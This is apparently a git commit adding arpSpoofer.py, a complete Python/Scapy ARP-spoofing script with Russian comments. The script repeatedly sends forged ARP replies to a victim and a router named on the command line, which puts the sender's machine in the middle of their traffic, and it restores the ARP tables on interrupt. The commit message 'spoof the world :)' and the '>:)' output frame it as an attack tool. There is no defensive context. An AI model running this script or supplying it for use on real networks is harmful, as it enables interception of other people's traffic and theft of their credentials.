e89eedef8c1619b1bbf07d595dc36c4ca406694b
phantom <phantom@void>
2025-01-05 03:41:04 -0700

    spoof the world :)

---
+++ arpSpoofer.py
@@ -0,0 +1,36 @@
+from scapy.all import *
+import sys
+
+def arp_spoof(dest_ip, dest_mac, source_ip):
+    # Создаем Ethernet-пакет
+    ether = Ether(dst = dest_mac)
+    # Создаем ARP-пакет
+    arp = ARP(op = 'is-at', psrc = source_ip, hwsrc = get_if_hwaddr(conf.iface), pdst = dest_ip)
+    # Объединяем их
+    packet = ether / arp
+    sendp(packet, verbose = False)  # Используем sendp для отправки Ethernet-пакета
+
+def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
+    ether = Ether(dst = dest_mac)
+    arp = ARP(op = 'is-at', hwsrc = source_mac, psrc = source_ip, pdst = dest_ip)
+    packet = ether / arp
+    sendp(packet, verbose = False)
+
+def main():
+    victim_ip = sys.argv[1]
+    router_ip = sys.argv[2]
+
+    victim_mac = getmacbyip(victim_ip)
+    router_mac = getmacbyip(router_ip)
+
+    try:
+        print('Send ARP-spoof >:)')
+        while True:
+            arp_spoof(victim_ip, victim_mac, router_ip)
+            arp_spoof(router_ip, router_mac, victim_ip)
+    except KeyboardInterrupt:
+        print('Restoring ARP-tables >:/')
+        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
+        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
+
+main()
